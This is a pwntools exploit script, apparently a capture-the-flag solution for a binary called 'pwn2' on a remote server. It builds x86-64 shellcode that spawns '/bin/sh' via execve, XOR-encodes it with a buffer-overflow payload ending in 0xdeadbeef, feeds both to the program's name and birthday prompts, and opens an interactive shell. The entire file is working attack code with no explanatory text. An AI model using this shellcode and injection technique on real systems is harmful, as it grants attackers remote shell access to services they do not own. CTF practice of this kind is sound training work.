#!/usr/bin/env python3
from pwn import *
context.binary = exe = ELF('pwn2', checksec = False)

# p = process(exe.path)
p = remote('103.197.184.48', 13333)

input()

shellcode = asm(
    '''
    mov rax, 29400045130965551
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    '''
)
print(shellcode)
payload = b'a'*52 + p32(0xdeadbeef)
key = payload
encoded = bytes([b ^ key[i % len(key)] for i, b in enumerate(shellcode)])

p.sendlineafter(b'Enter your name: ', encoded)
p.sendlineafter(b'Enter your birthday: ', payload)



p.interactive()